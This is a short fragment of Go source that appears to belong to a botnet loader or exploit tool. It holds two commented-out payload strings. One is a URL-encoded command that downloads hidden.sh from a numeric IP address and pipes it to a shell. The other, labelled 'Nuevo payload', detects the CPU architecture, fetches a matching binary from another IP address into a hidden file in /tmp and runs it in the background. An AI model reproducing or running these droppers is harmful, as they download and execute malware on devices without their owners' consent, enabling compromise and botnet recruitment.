...
var (
	...
	//payload = "sh%20-c%20%27wget%20http%3A%2F%2F154.216.20.65%2Fhidden.sh%20-O-%7Csh%27%20%26"
	
	// Nuevo payload: cd /tmp && a=$(uname -m); case $a in x86_64) b="x86_64";; i?86) b="x86";; armv7l) b="arm7";; armv6l) b="arm6";; armv5l) b="arm5";; aarch64) b="aarch64";; mips) b="mips";; mipsel) b="mipsel";; *) b="x86_64";; esac; wget -q http://172.96.140.62:1283/bins/$b -O .x && chmod +x .x && ./.x &
